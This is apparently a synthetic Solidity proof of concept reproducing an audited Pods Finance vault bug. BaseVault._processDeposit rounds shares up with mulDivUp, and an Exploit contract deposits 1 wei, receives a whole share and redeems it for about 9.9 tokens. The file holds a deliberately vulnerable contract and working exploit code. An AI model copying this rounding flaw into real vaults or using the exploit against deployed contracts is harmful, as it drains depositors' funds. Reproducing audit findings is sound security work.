// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Pods Finance — BaseVault._processDeposit rounds shares up
    (OpenZeppelin, finding 10416).
    SYNTHETIC, cheatcode-free. The audited line is
    `shares = assets.mulDivUp(supply, currentAssets)`.
    Vault: 1000e18 assets, 100 shares. A 1-wei deposit rounds up to 1 share
    (round-down is 0). Redeeming that share pays 9900990099009900990 assets. */

library MulDiv10416 {
    function mulDivUp(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return (a * b + c - 1) / c;
    }
}

contract Asset10416 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function pull(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[msg.sender] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract BaseVault {
    using MulDiv10416 for uint256;

    struct DepositEntry {
        address owner;
        uint256 amount;
    }

    Asset10416 public asset;
    uint256 internal _totalSupply;
    mapping(address => uint256) internal _balances;
    uint256 public lastShares;

    constructor(Asset10416 _asset) {
        asset = _asset;
        _totalSupply = 100;
        _balances[address(1)] = 100;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function _mint(address to, uint256 shares) internal {
        _totalSupply += shares;
        _balances[to] += shares;
    }

    function _burn(address from, uint256 shares) internal {
        _totalSupply -= shares;
        _balances[from] -= shares;
    }

    function _processDeposit(DepositEntry memory depositEntry, uint256 currentAssets) internal {
        uint256 supply = totalSupply();
        uint256 assets = depositEntry.amount;
        // @> VULN: mulDivUp mints a whole share for 1 wei when the share price is above 1
        uint256 shares = currentAssets == 0 || supply == 0 ? assets : assets.mulDivUp(supply, currentAssets);
        lastShares = shares;
        _mint(depositEntry.owner, shares);
    }

    function processQueuedDeposit(address owner, uint256 amount) external {
        uint256 currentAssets = 1000 ether;
        asset.pull(msg.sender, amount);
        DepositEntry memory depositEntry = DepositEntry(owner, amount);
        _processDeposit(depositEntry, currentAssets);
    }

    function redeem(uint256 shares) external returns (uint256 assetsOut) {
        assetsOut = shares * asset.balanceOf(address(this)) / totalSupply();
        _burn(msg.sender, shares);
        asset.transfer(msg.sender, assetsOut);
    }
}

contract Exploit {
    uint256 public constant WITHDRAWN = 9900990099009900990;
    uint256 public constant EXTRA_SHARES = 1;

    Asset10416 public asset;
    BaseVault public vault;

    constructor() {
        asset = new Asset10416();
        vault = new BaseVault(asset);
        asset.mint(address(vault), 1000 ether);
    }

    function run() external {
        asset.mint(address(this), 1);
        vault.processQueuedDeposit(address(this), 1);
        require(vault.balanceOf(address(this)) == EXTRA_SHARES, "extra share");
        require((uint256(1) * 100) / (1000 ether) == 0, "fair shares are 0");
        uint256 out = vault.redeem(1);
        require(out == WITHDRAWN, "assets withdrawn");
        require(asset.balanceOf(address(this)) == WITHDRAWN, "attacker balance");
    }
}
